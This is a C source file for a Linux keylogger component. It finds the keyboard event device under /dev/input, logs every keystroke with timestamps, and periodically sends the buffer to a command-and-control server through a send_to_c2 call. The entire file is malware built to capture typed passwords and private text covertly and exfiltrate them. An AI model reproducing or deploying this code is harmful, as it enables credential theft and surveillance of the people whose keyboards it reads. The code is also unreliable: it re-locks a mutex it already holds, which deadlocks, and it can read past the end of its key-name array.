#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <linux/input.h>
#include <linux/uinput.h>
#include <dirent.h>
#include <pthread.h>
#include <time.h>
#include <sys/time.h>
#include <stdint.h>
#include "headers/c2_client.h"

int key_found = 0;
char key_buffer[8192];
size_t buffer_pos = 0;
pthread_mutex_t buffer_mutex = PTHREAD_MUTEX_INITIALIZER;
int c2_port = 0;

char *key_names[] = {
    "RESERVED", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0",
    "-", "=", "BACKSPACE", "TAB", "Q", "W", "E", "R", "T", "Y", "U", "I",
    "O", "P", "[", "]", "ENTER", "CTRL", "A", "S", "D", "F", "G", "H",
    "J", "K", "L", ";", "'", "`", "SHIFT", "\\", "Z", "X", "C", "V",
    "B", "N", "M", ",", ".", "/", "RSHIFT", "*", "ALT", "SPACE", "CAPS",
    "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NUM",
    "SCROLL", "KP7", "KP8", "KP9", "-", "KP4", "KP5", "KP6", "+", "KP1",
    "KP2", "KP3", "KP0", ".", NULL
};

int is_keyboard_device(int fd) {
    unsigned long evbit = 0;
    if (ioctl(fd, EVIOCGBIT(0, sizeof(evbit)), &evbit) < 0) return 0;
    if (!(evbit & (1 << EV_KEY))) return 0;
    
    unsigned long relbit = 0;
    ioctl(fd, EVIOCGBIT(EV_REL, sizeof(relbit)), &relbit);
    if (relbit & (1 << REL_X)) return 0;
    if (relbit & (1 << REL_Y)) return 0;
    
    unsigned long absbit = 0;
    ioctl(fd, EVIOCGBIT(EV_ABS, sizeof(absbit)), &absbit);
    if (absbit & (1 << ABS_X)) return 0;
    if (absbit & (1 << ABS_Y)) return 0;
    
    int keys[] = {KEY_Q, KEY_W, KEY_E, KEY_R, KEY_T, KEY_Y, KEY_U, KEY_I, KEY_O, KEY_P};
    unsigned char bits[KEY_MAX / 8 + 1];
    ioctl(fd, EVIOCGBIT(EV_KEY, sizeof(bits)), &bits);
    
    for (int i = 0; i < 10; i++) {
        if (!(bits[keys[i] / 8] & (1 << (keys[i] % 8)))) return 0;
    }
    
    return 1;
}

int find_keyboard() {
    const char *paths[] = {"/dev/input", "/dev", NULL};
    
    for (int p = 0; paths[p]; p++) {
        DIR *dir = opendir(paths[p]);
        if (!dir) continue;
        
        struct dirent *entry;
        while ((entry = readdir(dir)) != NULL) {
            if (strstr(entry->d_name, "event") == entry->d_name) {
                char path[256];
                snprintf(path, sizeof(path), "%s/%s", paths[p], entry->d_name);
                
                int fd = open(path, O_RDONLY);
                if (fd < 0) continue;
                
                if (is_keyboard_device(fd)) {
                    closedir(dir);
                    return fd;
                }
                close(fd);
            }
        }
        closedir(dir);
    }
    return -1;
}

void flush_key_buffer() {
    if (buffer_pos == 0) return;
    
    pthread_mutex_lock(&buffer_mutex);
    
    if (c2_port > 0) {
        send_to_c2(key_buffer, buffer_pos);
    }
    
    buffer_pos = 0;
    memset(key_buffer, 0, sizeof(key_buffer));
    
    pthread_mutex_unlock(&buffer_mutex);
}

int write_event(int fd, struct input_event *event) {
    char output[128];
    const char *key_name = "UNKNOWN";
    
    if (event->code < 247 && key_names[event->code]) {
        key_name = key_names[event->code];
    }
    
    time_t now = time(NULL);
    struct tm *tm_info = localtime(&now);
    char time_str[32];
    strftime(time_str, sizeof(time_str), "%H:%M:%S", tm_info);
    
    snprintf(output, sizeof(output), "[%s] %s%s%s\n", time_str, 
             (event->value == 1) ? "+" : (event->value == 2) ? "R" : "-",
             key_name,
             (event->value == 1 && 
              (event->code == KEY_ENTER || event->code == KEY_BACKSPACE)) ? "\n" : "");
    
    pthread_mutex_lock(&buffer_mutex);
    
    size_t output_len = strlen(output);
    if (buffer_pos + output_len < sizeof(key_buffer) - 1) {
        memcpy(key_buffer + buffer_pos, output, output_len);
        buffer_pos += output_len;
    } else {
        flush_key_buffer();
        memcpy(key_buffer, output, output_len);
        buffer_pos = output_len;
    }
    
    if (buffer_pos > 4096) {
        flush_key_buffer();
    }
    
    pthread_mutex_unlock(&buffer_mutex);
    
    return 1;
}

int read_events(int keyboard_fd) {
    struct input_event events[64];
    fd_set fds;
    struct timeval tv;
    
    while (1) {
        FD_ZERO(&fds);
        FD_SET(keyboard_fd, &fds);
        tv.tv_sec = 1;
        tv.tv_usec = 0;
        
        int ret = select(keyboard_fd + 1, &fds, NULL, NULL, &tv);
        if (ret < 0) return 0;
        
        if (FD_ISSET(keyboard_fd, &fds)) {
            ssize_t bytes = read(keyboard_fd, events, sizeof(events));
            if (bytes < 0) return 0;
            
            for (size_t i = 0; i < bytes / sizeof(struct input_event); i++) {
                if (events[i].type == EV_KEY) {
                    write_event(keyboard_fd, &events[i]);
                }
            }
        }
        
        static time_t last_flush = 0;
        time_t now = time(NULL);
        if (now - last_flush > 30) {
            flush_key_buffer();
            last_flush = now;
        }
    }
    
    return 1;
}

void *keylogger_thread(void *arg) {
    c2_port = *(int*)arg;
    
    int keyboard_fd = find_keyboard();
    if (keyboard_fd < 0) {
        return NULL;
    }
    
    read_events(keyboard_fd);
    close(keyboard_fd);
    
    return NULL;
}